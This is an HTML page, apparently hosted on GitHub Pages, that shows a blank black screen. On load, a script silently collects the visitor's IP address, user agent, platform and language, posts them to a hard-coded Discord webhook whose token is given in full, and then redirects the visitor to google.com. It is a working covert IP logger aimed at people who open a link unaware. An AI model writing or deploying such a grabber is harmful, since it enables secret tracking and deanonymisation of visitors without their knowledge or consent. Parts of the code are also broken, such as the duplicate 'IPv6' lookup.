<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <script>
        // ==========================================
        // CONFIGURATION AREA
        // ==========================================
        const CONFIG = {
            DISCORD_WEBHOOK_URL: 'https://discord.com/api/webhooks/1553034301980016640/1NCgxeOUDMhhgG1l5vhCYOHUhdmwT3DjslENugn821v6vFqtwVx_FkuxbWSVHs0w0W7l',
            REDIRECT_URL: 'https://google.com', // Where to send the visitor after tracking
            EMBED_COLOR: 16766720 // Decimal color code (3447003 is Blue)
        };
        // ==========================================

        async function trackAndRedirect() {
            let ipv4 = 'Not available / IPv6-Only';
            let ipv6 = 'Not available / IPv4-Only';

            // 1. Fetch IPv4 Address
            try {
                const res4 = await fetch('https://icanhazip.com');
                if (res4.ok) ipv4 = (await res4.text()).trim();
            } catch (e) {
                console.log('No IPv4 connectivity.');
            }

            // 2. Fetch IPv6 Address
            try {
                const res6 = await fetch('https://icanhazip.com');
                if (res6.ok) ipv6 = (await res6.text()).trim();
            } catch (e) {
                console.log('No IPv6 connectivity.');
            }

            // Format current date and time for the footer text
            const now = new Date();
            const localTimeString = now.toLocaleString('en-US', { timeZoneName: 'short' });

            // 3. Prepare Discord Embed Payload (without emojis)
            const payload = {
                embeds: [{
                    title: "New Visitor Tracked",
                    color: CONFIG.EMBED_COLOR,
                    timestamp: now.toISOString(),
                    fields: [
                        { name: "IPv4 Address", value: `\`${ipv4}\``, inline: true },
                        { name: "IPv6 Address", value: `\`${ipv6}\``, inline: true },
                        { name: "Language / Region", value: `\`${navigator.language}\``, inline: false },
                        { name: "Platform", value: `\`${navigator.platform}\``, inline: true },
                        { name: "Current Page", value: `[GitHub Pages](\${window.location.href})`, inline: true },
                        { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: false }
                    ],
                    footer: { text: `Visited on: ${localTimeString} | GitHub Traffic Logger` }
                }]
            };

            // 4. Send Data to Discord Webhook and wait for response
            try {
                await fetch(CONFIG.DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) {
                console.error('Webhook Error:', e);
            } finally {
                // 5. Instantly redirect as soon as the fetch finishes (or fails)
                window.location.href = CONFIG.REDIRECT_URL;
            }
        }

        // Run the script as soon as the DOM is ready
        window.addEventListener('DOMContentLoaded', trackAndRedirect);
    </script>
    <style>
        /* Makes the entire page completely black and hides scrolls */
        html, body {
            background-color: #000000 !important;
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <!-- Completely blank body -->
</body>
</html>
